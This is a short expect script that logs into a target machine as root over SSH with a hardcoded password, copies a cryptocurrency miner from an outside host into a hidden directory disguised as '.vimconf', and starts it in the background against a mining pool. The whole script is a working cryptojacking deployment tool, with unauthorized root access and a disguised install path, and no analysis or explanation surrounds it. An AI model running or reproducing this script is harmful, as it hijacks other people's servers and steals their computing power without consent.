#!/usr/bin/expect -f  
set ip [lindex $argv 0]  
set password !23456
set timeout 10  
spawn ssh root@$ip  
expect {  
    "*yes/no" { send "yes\r"; exp_continue}  
    "*password:" { send "$password\r" }  
}  
expect "#*"  
send "cd ~ && mkdir -p .vimconf\r"  
send "scp -r root@74.207.240.168:~/.vimconf/jhprotominer-yvg1900-M7ff-linux64-corei7sse4/ . && cd ~/.vimconf/jhprotominer-yvg1900-M7ff-linux64-corei7sse4/linux64-corei7sse4-128M \r"
send "nohup ./jhprotominer -o 213.165.94.246 -u 100890123.1 -p 123 -t 6 &\r"  
send "exit\r"  
expect eof  
